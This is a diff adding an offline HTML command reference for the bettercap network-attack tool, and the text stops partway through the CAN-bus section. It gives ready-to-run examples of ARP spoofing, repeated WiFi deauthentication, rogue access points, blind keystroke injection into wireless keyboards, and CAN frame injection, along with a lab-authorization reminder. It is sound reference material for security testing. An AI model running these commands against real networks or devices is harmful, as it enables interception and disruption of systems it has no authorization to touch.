@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>bettercap — Command Reference</title>
+<style>
+  :root{
+    --bg:#11151b;
+    --panel:#161b23;
+    --panel-2:#1b212b;
+    --line:#262e3a;
+    --line-soft:#1f2630;
+    --text:#dbe2ea;
+    --muted:#8793a3;
+    --muted-2:#5e6878;
+    --amber:#e8a33d;
+    --amber-dim:#8a6626;
+    --cyan:#5fc6d9;
+    --red:#d9705f;
+    --mono: ui-monospace, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0; background:var(--bg); color:var(--text);
+    font-family:var(--sans); font-size:15px; line-height:1.55;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:var(--cyan); text-decoration:none;}
+  a:hover{text-decoration:underline;}
+  code, .mono, pre, kbd, .cmd, table.params td:first-child, table.cmds td:first-child{
+    font-family:var(--mono);
+  }
+  ::selection{ background:var(--amber-dim); color:#fff; }
+
+  /* ---------- layout ---------- */
+  .shell{ display:flex; min-height:100vh; max-width:1500px; margin:0 auto; }
+  nav.side{
+    width:280px; flex:0 0 280px; border-right:1px solid var(--line);
+    position:sticky; top:0; align-self:flex-start; height:100vh; overflow-y:auto;
+    padding:22px 16px 40px; background:var(--panel);
+  }
+  main{ flex:1 1 auto; min-width:0; padding:36px 48px 100px; }
+
+  .brand{ padding:0 4px 18px; border-bottom:1px solid var(--line); margin-bottom:18px; }
+  .brand .tag{ color:var(--amber); font-family:var(--mono); font-size:12px; letter-spacing:.02em; }
+  .brand h1{ font-size:19px; margin:6px 0 2px; font-weight:650; }
+  .brand .sub{ color:var(--muted); font-size:12.5px; }
+
+  #filter{
+    width:100%; background:var(--panel-2); border:1px solid var(--line);
+    color:var(--text); border-radius:7px; padding:9px 11px; font-size:13.5px;
+    margin-bottom:16px; font-family:var(--sans);
+  }
+  #filter:focus{ outline:none; border-color:var(--amber-dim); }
+  #filter::placeholder{ color:var(--muted-2); }
+
+  .side-group{ margin-bottom:4px; }
+  .side-group > .gtitle{
+    color:var(--muted); font-size:11px; letter-spacing:.06em; text-transform:uppercase;
+    padding:14px 8px 6px; font-weight:600;
+  }
+  .side-group a{
+    display:block; color:var(--text); padding:5px 8px; border-radius:6px; font-size:13.5px;
+    border-left:2px solid transparent;
+  }
+  .side-group a:hover{ background:var(--panel-2); text-decoration:none; }
+  .side-group a .d{ color:var(--muted-2); font-weight:400; }
+  .side-group a.hidden, .mod.hidden{ display:none; }
+
+  /* ---------- typography ---------- */
+  h2.cat{
+    font-size:12px; letter-spacing:.08em; text-transform:uppercase; color:var(--amber);
+    margin:56px 0 18px; padding-bottom:10px; border-bottom:1px solid var(--line);
+  }
+  h2.cat:first-of-type{ margin-top:0; }
+  h3.title{ font-size:21px; margin:0 0 4px; font-weight:650; letter-spacing:-.01em; }
+  p.lede{ color:var(--muted); margin:0 0 16px; max-width:72ch; }
+
+  .badge{
+    display:inline-block; font-family:var(--mono); font-size:10.5px; padding:2px 7px;
+    border-radius:4px; border:1px solid var(--amber-dim); color:var(--amber);
+    vertical-align:middle; margin-left:8px; letter-spacing:.02em;
+  }
+  .badge.platform{ border-color:#3a4555; color:var(--muted); }
+
+  /* ---------- intro / callouts ---------- */
+  .hero{ max-width:78ch; margin-bottom:10px; }
+  .hero .eyebrow{ font-family:var(--mono); color:var(--amber); font-size:12.5px; }
+  .hero h1{ font-size:30px; margin:8px 0 10px; letter-spacing:-.015em; }
+  .hero p{ color:var(--muted); max-width:68ch; }
+
+  .callout{
+    background:var(--panel); border:1px solid var(--line); border-left:3px solid var(--amber-dim);
+    border-radius:8px; padding:16px 18px; margin:22px 0; max-width:82ch;
+  }
+  .callout h4{ margin:0 0 8px; font-size:13.5px; color:var(--amber); font-weight:650; }
+  .callout p{ margin:0 0 8px; color:var(--text); font-size:14px; }
+  .callout p:last-child{ margin-bottom:0; }
+  .callout code{ background:var(--panel-2); padding:1px 5px; border-radius:4px; font-size:13px; }
+
+  /* ---------- tables ---------- */
+  table{ width:100%; border-collapse:collapse; margin:10px 0 20px; font-size:13.8px; }
+  table.cmds td, table.params td, table.flags td{ padding:8px 10px; border-top:1px solid var(--line-soft); vertical-align:top; }
+  table.cmds td:first-child, table.flags td:first-child{ color:var(--amber); white-space:nowrap; width:1%; }
+  table.params td:first-child{ color:var(--cyan); white-space:nowrap; width:1%; }
+  table.params td:nth-child(2){ color:var(--muted); white-space:nowrap; width:1%; }
+  table.cmds td:last-child, table.params td:last-child, table.flags td:last-child{ color:var(--text); }
+  table thead td{ color:var(--muted-2); font-size:11px; text-transform:uppercase; letter-spacing:.05em; border-top:none; padding-bottom:6px;}
+
+  details.params{ margin:-4px 0 20px; }
+  details.params > summary{
+    cursor:pointer; color:var(--muted); font-size:12.5px; padding:4px 0; list-style:none;
+    font-family:var(--mono);
+  }
+  details.params > summary::-webkit-details-marker{ display:none; }
+  details.params > summary::before{ content:"▸ "; color:var(--amber-dim); }
+  details.params[open] > summary::before{ content:"▾ "; }
+
+  pre{
+    background:#0d1016; border:1px solid var(--line); border-radius:8px;
+    padding:14px 16px; overflow-x:auto; font-size:13px; line-height:1.6; margin:4px 0 22px;
+  }
+  pre .c1{ color:var(--muted-2); }
+  .term-label{ font-family:var(--mono); font-size:10.5px; color:var(--muted-2); margin:0 0 -16px 2px; display:block; letter-spacing:.03em; }
+
+  .mod{ margin-bottom:46px; padding-top:6px; scroll-margin-top:16px; }
+  .mod-head{ margin-bottom:12px; }
+
+  footer{
+    margin-top:70px; padding-top:20px; border-top:1px solid var(--line);
+    color:var(--muted-2); font-size:12.5px; max-width:82ch;
+  }
+  footer a{ color:var(--muted); }
+  footer p{ margin:0 0 10px; }
+
+  @media (max-width: 920px){
+    .shell{ display:block; }
+    nav.side{ position:relative; width:auto; height:auto; top:auto; border-right:none; border-bottom:1px solid var(--line); }
+    main{ padding:28px 20px 80px; }
+  }
+</style>
+</head>
+<body>
+<div class="shell">
+
+<nav class="side" id="side">
+  <div class="brand">
+    <div class="tag">LAB REFERENCE · OFFLINE COPY</div>
+    <h1>bettercap</h1>
+    <div class="sub">command &amp; module reference</div>
+  </div>
+
+  <input id="filter" type="text" placeholder="Filter commands…" autocomplete="off">
+
+  <div class="side-group">
+    <div class="gtitle">Start here</div>
+    <a href="#intro">Overview</a>
+    <a href="#launch">Launching &amp; CLI flags</a>
+    <a href="#core-commands">Core session commands</a>
+  </div>
+
+  <div class="side-group" data-cat="Core modules">
+    <div class="gtitle">Core modules</div>
+    <a href="#caplets">caplets</a>
+    <a href="#events-stream">events.stream</a>
+    <a href="#graph">graph</a>
+    <a href="#ticker">ticker</a>
+    <a href="#ui">ui <span class="d">web UI</span></a>
+    <a href="#update">update</a>
+    <a href="#api-rest">api.rest</a>
+    <a href="#c2">c2 <span class="d">IRC C2</span></a>
+  </div>
+
+  <div class="side-group" data-cat="Wireless & hardware">
+    <div class="gtitle">Wireless &amp; hardware</div>
+    <a href="#wifi">wifi</a>
+    <a href="#ble">ble</a>
+    <a href="#hid">hid <span class="d">2.4GHz</span></a>
+    <a href="#canbus">can <span class="d">CAN‑bus</span></a>
+  </div>
+
+  <div class="side-group" data-cat="IPv4 / IPv6 recon">
+    <div class="gtitle">IPv4 / IPv6 recon</div>
+    <a href="#net-probe">net.probe</a>
+    <a href="#net-recon">net.recon</a>
+    <a href="#zerogod">zerogod <span class="d">mDNS</span></a>
+    <a href="#net-sniff">net.sniff / net.fuzz</a>
+    <a href="#syn-scan">syn.scan</a>
+    <a href="#wol">wol</a>
+  </div>
+
+  <div class="side-group" data-cat="Spoofers">
+    <div class="gtitle">Spoofers (MITM)</div>
+    <a href="#arp-spoof">arp.spoof</a>
+    <a href="#dhcp6-spoof">dhcp6.spoof</a>
+    <a href="#dns-spoof">dns.spoof</a>
+    <a href="#ndp-spoof">ndp.spoof</a>
+  </div>
+
+  <div class="side-group" data-cat="Proxies">
+    <div class="gtitle">Proxies</div>
+    <a href="#any-proxy">any.proxy</a>
+    <a href="#dns-proxy">dns.proxy</a>
+    <a href="#http-proxy">http.proxy</a>
+    <a href="#https-proxy">https.proxy</a>
+    <a href="#packet-proxy">packet.proxy</a>
+    <a href="#ssh-proxy">ssh.proxy <span class="d">new</span></a>
+    <a href="#tcp-proxy">tcp.proxy</a>
+  </div>
+
+  <div class="side-group" data-cat="Servers">
+    <div class="gtitle">Rogue servers</div>
+    <a href="#http-server">http.server</a>
+    <a href="#https-server">https.server</a>
+    <a href="#mdns-server">mdns.server</a>
+    <a href="#mysql-server">mysql.server</a>
+  </div>
+
+  <div class="side-group" data-cat="Utils">
+    <div class="gtitle">Utils</div>
+    <a href="#gps">gps</a>
+    <a href="#mac-changer">mac.changer</a>
+  </div>
+
+  <div class="side-group">
+    <div class="gtitle">Appendix</div>
+    <a href="#events-ref">Event tags</a>
+  </div>
+</nav>
+
+<main>
+
+  <section id="intro" class="hero">
+    <div class="eyebrow">KALI LINUX · bettercap 2.41.x</div>
+    <h1>bettercap command reference</h1>
+    <p>A single-page reference to every interactive-session command bettercap ships, organized by module. Built for offline use on an isolated lab network — no external fonts, scripts, or trackers.</p>
+  </section>
+
+  <div class="callout">
+    <h4>About the version number</h4>
+    <p>On Kali, the string <code>v1.3.0</code> belongs to the <code>bettercap-ui</code> package (the Angular web UI bundle), not the bettercap engine itself. The engine — the part that owns every command on this page — is versioned separately and currently sits at <code>2.41.x</code> (checked against the Kali tool pages and the upstream <code>bettercap/bettercap</code> releases). Run <code>bettercap -version</code> in your VM to confirm what you actually have installed; everything below is written against the 2.41 command set.</p>
+    <p>This is also why the "new" commands you noticed exist: recent 2.x releases added the entire <strong>CAN‑bus</strong> module family, the <strong>zerogod</strong> mDNS/Bonjour impersonation module, the <strong>ssh.proxy</strong> MITM proxy, a scriptable <strong>dns.proxy</strong>, the <strong>c2</strong> IRC command‑and‑control module, and record/replay support for <strong>api.rest</strong>. They're all covered here.</p>
+  </div>
+
+  <div class="callout" style="border-left-color:var(--red);">
+    <h4>Lab-use reminder</h4>
+    <p>Every module here performs active reconnaissance, spoofing, or interception. Only point it at interfaces, networks, and VMs you own or have explicit written authorization to test — this build is for an isolated lab, and it should stay that way.</p>
+  </div>
+
+  <h2 class="cat" id="launch">Launching &amp; CLI flags</h2>
+  <p class="lede">Flags passed to the <code>bettercap</code> binary itself, before the interactive session starts.</p>
+  <table class="flags">
+    <thead><tr><td>Flag</td><td>Purpose</td></tr></thead>
+    <tr><td>-iface IFACE</td><td>Network interface to bind to (name, IP, or MAC). Auto-detected if omitted.</td></tr>
+    <tr><td>-caplet FILE</td><td>Load and run a <code>.cap</code> script file in the session.</td></tr>
+    <tr><td>-caplets-path PATH</td><td>Alternative base path to search for caplets.</td></tr>
+    <tr><td>-eval "CMDS"</td><td>Run one or more <code>;</code>-separated commands on startup — handy for one-liners.</td></tr>
+    <tr><td>-script FILE</td><td>Load a JS session script (see the Scripting docs).</td></tr>
+    <tr><td>-autostart MODULES</td><td>Comma-separated modules to auto-start (defaults to <code>events.stream</code>).</td></tr>
+    <tr><td>-gateway-override ADDR</td><td>Use this IP as the gateway instead of the auto-detected one.</td></tr>
+    <tr><td>-no-history</td><td>Disable the <code>~/.bettercap.history</code> file.</td></tr>
+    <tr><td>-no-colors</td><td>Disable terminal colors/effects.</td></tr>
+    <tr><td>-env-file FILE</td><td>Preload parameters from this file (default <code>~/bettercap.env</code>); empty string disables persistence.</td></tr>
+    <tr><td>-silent</td><td>Suppress all non-error logs.</td></tr>
+    <tr><td>-debug</td><td>Enable debug logging.</td></tr>
+    <tr><td>-version</td><td>Print version/build info and exit.</td></tr>
+  </table>
+  <span class="term-label">Terminal — update caplets then quit</span>
+<pre>sudo bettercap -eval "caplets.update; q"</pre>
+
+  <h2 class="cat" id="core-commands">Core session commands</h2>
+  <p class="lede">Available in every session regardless of which modules are loaded. Chain commands with <code>;</code> on one line.</p>
+  <table class="cmds">
+    <tr><td>help</td><td>List every command, and show each module's running/not-running status.</td></tr>
+    <tr><td>help MODULE</td><td>Show the help menu for one module only.</td></tr>
+    <tr><td>active</td><td>Show which modules are currently running, with their parameters.</td></tr>
+    <tr><td>quit / q</td><td>Close the session.</td></tr>
+    <tr><td>sleep SECONDS</td><td>Pause for N seconds (useful inside caplets/tickers).</td></tr>
+    <tr><td>get PARAM</td><td>Print a parameter's value; <code>get *</code> dumps everything.</td></tr>
+    <tr><td>set PARAM VALUE</td><td>Set a parameter; <code>set PARAM ""</code> clears it.</td></tr>
+    <tr><td>read PARAM "PROMPT"</td><td>Interactively ask the user for a value and store it in PARAM.</td></tr>
+    <tr><td>clear</td><td>Clear the terminal.</td></tr>
+    <tr><td>include CAPLET</td><td>Load and run a caplet in the current session.</td></tr>
+    <tr><td>!COMMAND</td><td>Run a shell command and print its output into the session.</td></tr>
+    <tr><td>alias MAC NAME</td><td>Give an endpoint a friendly, persistent name (saved to <code>~/bettercap.aliases</code>).</td></tr>
+  </table>
+  <span class="term-label">Terminal — scripted example</span>
+<pre>set arp.spoof.targets 192.168.1.20; arp.spoof on
+help net.recon; q                         <span class="c1"># man-page style: show help then exit</span>
+read arp.spoof.targets "Target to spoof: "</pre>
+
+
+  <!-- ============ CORE MODULES ============ -->
+  <h2 class="cat">Core modules</h2>
+
+  <article class="mod" id="caplets">
+    <div class="mod-head"><h3 class="title">caplets</h3>
+      <p class="lede">Lists and updates installed caplets — scripted <code>.cap</code> session files, bettercap's equivalent of Metasploit <code>.rc</code> resource scripts.</p></div>
+    <table class="cmds">
+      <tr><td>caplets.show</td><td>List installed caplets.</td></tr>
+      <tr><td>caplets.paths</td><td>List the search paths used to find caplets.</td></tr>
+      <tr><td>caplets.update</td><td>Install/update the official caplet collection.</td></tr>
+    </table>
+  </article>
+
+  <article class="mod" id="events-stream">
+    <div class="mod-head"><h3 class="title">events.stream</h3>
+      <p class="lede">On by default. Reports every event other modules generate (new hosts, captured handshakes, log lines…) and can run commands in response to them.</p></div>
+    <table class="cmds">
+      <tr><td>events.stream on / off</td><td>Start or stop the stream.</td></tr>
+      <tr><td>events.show LIMIT</td><td>Print buffered events (optionally the last N).</td></tr>
+      <tr><td>events.ignore FILTER</td><td>Hide events whose tag matches FILTER (stackable).</td></tr>
+      <tr><td>events.include FILTER</td><td>Remove a previously added ignore filter.</td></tr>
+      <tr><td>events.filters / events.filters.clear</td><td>List / clear active ignore filters.</td></tr>
+      <tr><td>events.clear</td><td>Empty the events buffer.</td></tr>
+      <tr><td>events.waitfor TAG TIMEOUT</td><td>Block until an event with TAG fires (optional timeout, seconds).</td></tr>
+      <tr><td>events.on TAG COMMANDS</td><td>Register a trigger: run COMMANDS whenever TAG fires. Supports <code>{{Field}}</code> payload placeholders.</td></tr>
+      <tr><td>events.triggers / events.triggers.clear</td><td>List / clear all triggers.</td></tr>
+      <tr><td>events.trigger.delete ID</td><td>Remove one trigger by id.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>events.stream.output</td><td></td><td>Write events to this file instead of stdout.</td></tr>
+      <tr><td>events.stream.output.rotate*</td><td></td><td>Log rotation by size or time, with optional gzip compression.</td></tr>
+      <tr><td>events.stream.http.request.dump</td><td>false</td><td>Dump full HTTP request bodies.</td></tr>
+      <tr><td>events.stream.http.response.dump</td><td>false</td><td>Dump full HTTP response bodies.</td></tr>
+      <tr><td>events.stream.time.format</td><td>15:04:05</td><td>Go time-format string for event timestamps.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — auto-deauth a new client, auto-assoc a new AP</span>
+<pre>events.on wifi.client.new wifi.deauth {{Client/mac}}
+events.on wifi.ap.new wifi.assoc {{mac}}</pre>
+  </article>
+
+  <article class="mod" id="graph">
+    <div class="mod-head"><h3 class="title">graph</h3>
+      <p class="lede">Builds a connectivity graph of discovered WiFi and LAN nodes and exports it.</p></div>
+    <table class="cmds">
+      <tr><td>graph on / off</td><td>Start or stop graph tracking.</td></tr>
+      <tr><td>graph.to_dot MAC</td><td>Export a Graphviz <code>.dot</code> file (optionally filtered to one MAC).</td></tr>
+      <tr><td>graph.to_json MAC</td><td>Export JSON instead.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>graph.privacy</td><td>false</td><td>Obfuscate MAC addresses in exports.</td></tr>
+      <tr><td>graph.disconnected</td><td>false</td><td>Include disconnected edges.</td></tr>
+      <tr><td>graph.dot.layout / .name / .output</td><td>neato / bettergraph / bettergraph.dot</td><td>Graphviz export settings.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="ticker">
+    <div class="mod-head"><h3 class="title">ticker</h3>
+      <p class="lede">Runs a set of commands on a repeating interval — the engine behind most "live dashboard" caplets.</p></div>
+    <table class="cmds">
+      <tr><td>ticker on / off</td><td>Start/stop the <em>main</em> ticker.</td></tr>
+      <tr><td>ticker.create NAME PERIOD "CMDS"</td><td>Create and start a named ticker running CMDS every PERIOD seconds.</td></tr>
+      <tr><td>ticker.destroy NAME</td><td>Stop a named ticker.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>ticker.period</td><td>1</td><td>Seconds between main-ticker runs.</td></tr>
+      <tr><td>ticker.commands</td><td>clear; net.show; events.show 20</td><td>Commands the main ticker executes.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — redeauth a BSSID every 5 seconds</span>
+<pre>set ticker.period 5
+set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"
+ticker on
+<span class="c1"># or, as a named ticker that doesn't block the main one:</span>
+ticker.create deauthenticator 5 "wifi.deauth DE:AD:BE:EF:DE:AD"</pre>
+  </article>
+
+  <article class="mod" id="ui">
+    <div class="mod-head"><h3 class="title">ui</h3>
+      <p class="lede">Serves the bundled Angular web UI (the <code>bettercap-ui</code> package — the component actually versioned <code>1.3.0</code> on Kali).</p></div>
+    <table class="cmds">
+      <tr><td>ui on</td><td>Start the web UI.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>ui.address</td><td>127.0.0.1</td><td>Bind address.</td></tr>
+      <tr><td>ui.port</td><td>8080</td><td>Bind port.</td></tr>
+    </table></details>
+    <p class="lede" style="margin-top:-8px;">Default login is <code>user</code> / <code>pass</code> — change it before exposing this beyond <code>127.0.0.1</code>.</p>
+  </article>
+
+  <article class="mod" id="update">
+    <div class="mod-head"><h3 class="title">update</h3>
+      <p class="lede">Checks whether a newer stable bettercap release is available.</p></div>
+    <table class="cmds">
+      <tr><td>update.check on</td><td>Compare the running version against the latest stable release.</td></tr>
+    </table>
+  </article>
+
+  <article class="mod" id="api-rest">
+    <div class="mod-head"><h3 class="title">api.rest <span class="badge">automation</span></h3>
+      <p class="lede">A RESTful API over the live session — read state, post commands, and now record/replay whole sessions. Unauthenticated HTTP by default.</p></div>
+    <table class="cmds">
+      <tr><td>api.rest on / off</td><td>Start/stop the API server.</td></tr>
+      <tr><td>api.rest.record FILE</td><td>Poll the API on a timer and record samples to a compressed file.</td></tr>
+      <tr><td>api.rest.record off</td><td>Stop recording.</td></tr>
+      <tr><td>api.rest.replay FILE</td><td>Replay a recorded session through the API instead of live data.</td></tr>
+      <tr><td>api.rest.replay off</td><td>Return to live mode.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>api.rest.address / .port</td><td>127.0.0.1 / 8081</td><td>Bind address and port.</td></tr>
+      <tr><td>api.rest.username / .password</td><td>user / pass</td><td>HTTP basic-auth credentials.</td></tr>
+      <tr><td>api.rest.certificate / .key</td><td></td><td>Fill both to switch the API to HTTPS (auto-generated if missing).</td></tr>
+      <tr><td>api.rest.websocket</td><td>false</td><td>Serve <code>/api/events</code> as a websocket instead of plain HTTP.</td></tr>
+      <tr><td>api.rest.alloworigin</td><td>*</td><td>CORS <code>Access-Control-Allow-Origin</code> value.</td></tr>
+      <tr><td>api.rest.record.clock</td><td>1</td><td>Seconds between samples while recording.</td></tr>
+    </table></details>
+    <p class="lede" style="margin:-4px 0 10px;">Key routes: <code>GET /api/session</code>, <code>GET /api/session/lan</code>, <code>GET /api/session/wifi</code>, <code>GET /api/session/ble</code>, <code>GET /api/session/hid</code>, <code>GET /api/events</code>, <code>DELETE /api/events</code>, <code>POST /api/session</code> (body <code>{"cmd":"net.probe on"}</code>), <code>GET /api/file?name=FILE</code>.</p>
+  </article>
+
+  <article class="mod" id="c2">
+    <div class="mod-head"><h3 class="title">c2 <span class="badge">new</span></h3>
+      <p class="lede">Command-and-control over IRC: push session events to a channel and run commands sent back by an operator. Useful for multi-host lab exercises.</p></div>
+    <table class="cmds">
+      <tr><td>c2 on / off</td><td>Connect / disconnect from the configured IRC server.</td></tr>
+      <tr><td>c2.channel.set TAG CHANNEL</td><td>Route events tagged TAG to a specific channel.</td></tr>
+      <tr><td>c2.channel.clear TAG</td><td>Remove that routing.</td></tr>
+      <tr><td>c2.template.set TAG TEMPLATE</td><td>Customize the report format for events tagged TAG.</td></tr>
+      <tr><td>c2.template.clear TAG</td><td>Reset to the default template.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>c2.server</td><td>localhost:6697</td><td>IRC server:port.</td></tr>
+      <tr><td>c2.server.tls / .tls.verify</td><td>true / false</td><td>TLS on by default; cert validation off by default.</td></tr>
+      <tr><td>c2.nick / .username / .password</td><td>bettercap / bettercap / password</td><td>IRC identity.</td></tr>
+      <tr><td>c2.operator</td><td>admin</td><td>Only this nick's commands are executed.</td></tr>
+      <tr><td>c2.channel.control / .events / .output</td><td>#events</td><td>Default channels for commands in / events out / output out.</td></tr>
+    </table></details>
+  </article>
+
+
+  <!-- ============ WIRELESS & HARDWARE ============ -->
+  <h2 class="cat">Wireless &amp; hardware</h2>
+
+  <article class="mod" id="wifi">
+    <div class="mod-head"><h3 class="title">wifi</h3>
+      <p class="lede">802.11 recon, deauth, PMKID/handshake capture, rogue APs and fake probes. Needs an interface in monitor mode with injection — bettercap switches modes automatically.</p></div>
+    <table class="cmds">
+      <tr><td>wifi.recon on / off</td><td>Start/stop AP discovery and automatic handshake/PMKID capture.</td></tr>
+      <tr><td>wifi.recon BSSID</td><td>Filter recon to a single base station.</td></tr>
+      <tr><td>wifi.recon clear</td><td>Remove the BSSID filter.</td></tr>
+      <tr><td>wifi.recon.channel LIST</td><td>Comma-separated channels to hop; <code>clear</code> hops every supported channel.</td></tr>
+      <tr><td>wifi.clear</td><td>Wipe the discovered-AP list.</td></tr>
+      <tr><td>wifi.show</td><td>Show discovered stations, sorted by RSSI by default.</td></tr>
+      <tr><td>wifi.show.wps BSSID</td><td>Show WPS info for a station (or <code>all</code>).</td></tr>
+      <tr><td>wifi.assoc BSSID</td><td>Send an association request to harvest a PMKID (<code>all</code>/<code>*</code> for every AP).</td></tr>
+      <tr><td>wifi.deauth BSSID</td><td>802.11 deauth attack (<code>all</code>/<code>*</code> for every station).</td></tr>
+      <tr><td>wifi.probe BSSID ESSID</td><td>Send a spoofed client probe request.</td></tr>
+      <tr><td>wifi.ap</td><td>Beacon a rogue access point (requires <code>wifi.recon on</code>).</td></tr>
+      <tr><td>wifi.channel_switch_announce BSSID CHANNEL</td><td>Force clients off-channel via a spoofed CSA frame.</td></tr>
+      <tr><td>wifi.bruteforce on / off</td><td>Wordlist-based WiFi auth bruteforce.</td></tr>
+      <tr><td>wifi.client.probe.ap.filter / .sta.filter REGEX</td><td>Regex filters for probe-request logging.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>wifi.interface</td><td></td><td>Use a different interface than <code>-iface</code> for WiFi only.</td></tr>
+      <tr><td>wifi.recon.channel</td><td></td><td>See <code>wifi.recon.channel</code> above.</td></tr>
+      <tr><td>wifi.hop.period</td><td>250</td><td>ms spent per channel while hopping.</td></tr>
+      <tr><td>wifi.rssi.min</td><td>-200</td><td>Minimum signal strength to report.</td></tr>
+      <tr><td>wifi.sta.ttl / wifi.ap.ttl</td><td>300</td><td>Seconds of silence before a station/AP is pruned.</td></tr>
+      <tr><td>wifi.handshakes.file</td><td>~/bettercap-wifi-handshakes.pcap</td><td>Capture output.</td></tr>
+      <tr><td>wifi.handshakes.aggregate</td><td>true</td><td>Single pcap vs. one file per network.</td></tr>
+      <tr><td>wifi.deauth.open / .acquired / .skip</td><td>true / false / —</td><td>Control which APs get deauthed.</td></tr>
+      <tr><td>wifi.assoc.open / .acquired / .skip / .silent</td><td>false / false / — / false</td><td>Control PMKID association behavior.</td></tr>
+      <tr><td>wifi.ap.ssid / .bssid / .channel / .encryption</td><td>FreeWifi / random / 1 / true</td><td>Rogue AP settings.</td></tr>
+      <tr><td>wifi.show.sort / .filter / .limit / .manufacturer</td><td>rssi asc</td><td>Fields: rssi, bssid, essid, channel, encryption, clients, seen, sent, rcvd.</td></tr>
+      <tr><td>wifi.bruteforce.wordlist / .target / .workers / .timeout / .wide / .stop_at_first</td><td>/usr/share/dict/words · — · 1 · 15 · false · true</td><td>Bruteforce tuning — keep workers low, routers ban fast.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — scan 1/2/3, grab PMKIDs + handshakes passively</span>
+<pre>wifi.recon.channel 1,2,3; wifi.recon on</pre>
+    <span class="term-label">Terminal — rogue open AP "Banana" on ch.5</span>
+<pre>set wifi.ap.ssid Banana
+set wifi.ap.bssid DE:AD:BE:EF:DE:AD
+set wifi.ap.channel 5
+set wifi.ap.encryption false
+wifi.recon on; wifi.ap</pre>
+  </article>
+
+  <article class="mod" id="ble">
+    <div class="mod-head"><h3 class="title">ble</h3>
+      <p class="lede">Bluetooth Low Energy discovery, GATT service/characteristic enumeration, and raw characteristic writes. Not supported on Windows/macOS.</p></div>
+    <table class="cmds">
+      <tr><td>ble.recon on / off</td><td>Start/stop BLE device discovery.</td></tr>
+      <tr><td>ble.clear</td><td>Clear discovered devices.</td></tr>
+      <tr><td>ble.show</td><td>List discovered devices.</td></tr>
+      <tr><td>ble.enum MAC</td><td>Connect and enumerate services/characteristics.</td></tr>
+      <tr><td>ble.write MAC UUID HEX</td><td>Write raw bytes to a characteristic.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>ble.device</td><td>-1</td><td>HCI device index; -1 autodetects.</td></tr>
+      <tr><td>ble.timeout</td><td>5</td><td>Connection timeout, seconds.</td></tr>
+      <tr><td>ble.ttl</td><td>30</td><td>Seconds before an unseen device is pruned.</td></tr>
+      <tr><td>ble.show.sort / .filter / .limit</td><td>rssi asc</td><td>Fields: rssi, mac, seen.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="hid">
+    <div class="mod-head"><h3 class="title">hid <span class="badge">RFStorm hardware</span></h3>
+      <p class="lede">Mousejack-style scanning and DuckyScript frame injection against 2.4GHz wireless keyboards/mice, via an RFStorm-flashed Nordic nRF24LU1+ dongle (CrazyRadio PA, Logitech Unifying, etc).</p></div>
+    <table class="cmds">
+      <tr><td>hid.recon on / off</td><td>Scan the 2.4GHz spectrum for HID dongles.</td></tr>
+      <tr><td>hid.clear</td><td>Clear discovered devices.</td></tr>
+      <tr><td>hid.show</td><td>List discovered devices.</td></tr>
+      <tr><td>hid.sniff ADDRESS</td><td>Collect payloads from one device (<code>clear</code> to stop).</td></tr>
+      <tr><td>hid.inject ADDRESS LAYOUT FILE</td><td>Inject a DuckyScript file as spoofed keystrokes. Layouts: BE BR CA CH DE DK ES FI FR GB HR IT NO PT RU SI SV TR US.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>hid.force.type</td><td>logitech</td><td>Force device type (<code>logitech</code>/<code>amazon</code>/<code>microsoft</code>) to inject blind, without a visible dongle.</td></tr>
+      <tr><td>hid.hop.period</td><td>100</td><td>ms per channel while hopping.</td></tr>
+      <tr><td>hid.ttl</td><td>1200</td><td>Seconds before a device is considered out of range.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — blind-inject without waiting for discovery</span>
+<pre>set hid.force.type logitech
+hid.recon on
+hid.inject 32:26:9f:a4:08 US ducky.txt</pre>
+  </article>
+
+  <article class="mod" id="canbus">
+    <div class="mod-head"><h3 class="title">can <span class="badge">new</span></h3>
+      <p class="lede">CAN-bus scanning, injection and fuzzing over SocketCAN adapters — with optional DBC decoding and a built-in OBD2 PID parser. Likely the most recent major module family.</p></div>
+    <table class="cmds">
+      <tr><td>can.recon on / off</td><td>Start/stop listening on the bus.</td></tr>
+      <tr><td>can.clear</td><td>Clear everything collected so far.</td></tr>
+      <tr><td>can.show</td><td>List detected ECUs/nodes.</td></tr>
+      <tr><td>can.dbc.load NAME</td><td>Load a DBC definition (bundled or from disk) to decode traffic.</td></tr>
+      <tr><td>can.inject id#hexdata</td><td>Inject a raw frame, e.g. <code>can.inject 0#aabbccddee</code>.</td></tr>
+      <tr><td>can.fuzz ID_OR_NODE SIZE</td><td>Generate and inject a randomized frame for an ID or DBC node name.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>can.device</td><td>can0</td><td>SocketCAN interface.</td></tr>
+      <tr><td>can.transport</td><td>can</td><td><code>can</code> for SocketCAN, or <code>udp</code>.</td></tr>
+      <tr><td>can.dump / can.dump.inject</td><td>— / false</td><td>Replay a candump log file; optionally re-inject it onto the bus.</td></tr>
